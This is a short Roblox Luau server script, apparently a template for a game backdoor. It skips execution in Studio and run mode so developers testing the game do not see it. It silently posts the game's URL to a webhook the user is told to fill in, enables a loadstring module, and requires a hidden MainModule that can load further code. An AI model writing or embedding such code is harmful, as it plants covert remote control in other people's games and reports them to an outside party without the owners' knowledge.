local RunService = game:GetService("RunService")
 
if RunService:IsStudio() then
	return;
end
 
if RunService:IsRunMode() then
	return;
end

pcall(function()
	local ID = game.PlaceId 
	
	local http = game:GetService("HttpService")
	local Data = {
		["content"] = "https://www.roblox.com/games/"..ID
	}
	
	Data = http:JSONEncode(Data)
	
	http:PostAsync("link", Data) --Put the link you saved between the two quotes.
	end) 

script.Loadstring.Parent = game:GetService("ServerStorage")

require(script.MainModule)()